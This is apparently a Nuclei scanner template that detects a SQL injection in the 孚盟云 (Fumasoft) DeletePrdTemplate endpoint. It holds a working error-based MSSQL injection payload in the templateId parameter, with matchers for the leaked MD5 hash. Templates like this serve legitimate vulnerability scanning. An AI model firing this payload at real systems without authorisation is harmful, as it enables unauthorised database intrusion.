id: poc-yaml-fumasoft-deleteprdtemplate-sqli
info:
  name: 孚盟云 DeletePrdTemplate SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - method: GET
    path:
      - "/m/Dingding/Ajax/AjaxProductTemplateList.ashx?method=DeletePrdTemplate&templateId=1+and+1%3Csys.fn_varbintohexstr(hashbytes(%27MD5%27,%27{{t1}}%27))--"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "0x{{t2}}"
          - "\"message\":"
        part: body
      - type: regex
        regex:
          - "转换成数据类型(.*?)时失败"
          - "在将(.*?)值"
      - type: word
        words:
          - "select  ID"
        part: body
        negative: true
